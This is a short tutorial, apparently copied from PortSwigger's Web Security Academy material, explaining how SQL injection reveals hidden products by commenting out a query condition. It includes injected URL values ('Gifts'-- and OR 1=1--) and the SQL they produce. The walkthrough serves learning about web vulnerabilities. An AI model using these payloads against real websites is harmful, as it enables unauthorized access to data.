# Retrieving hidden data

Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:
```bash
https://insecure-website.com/products?category=Gifts
```
This causes the application to make a SQL query to retrieve details of the relevant products from the database:
```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
This SQL query asks the database to return:
all details `(*)`<br>
from the `products` table<br>
where the `category` is `Gifts`<br>
and `released` is `1`<br>


The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:
```bash
https://insecure-website.com/products?category=Gifts'--
```
This results in the SQL query:
```bash
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Crucially, note that `--` is a comment indicator in SQL
You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:
```bash
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
This results in the SQL query:
```bash
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

https://github.com/offensivecyber03/PortSwigger/assets/71892943/50dc9e01-37ca-4745-aaa6-b75a566f9484

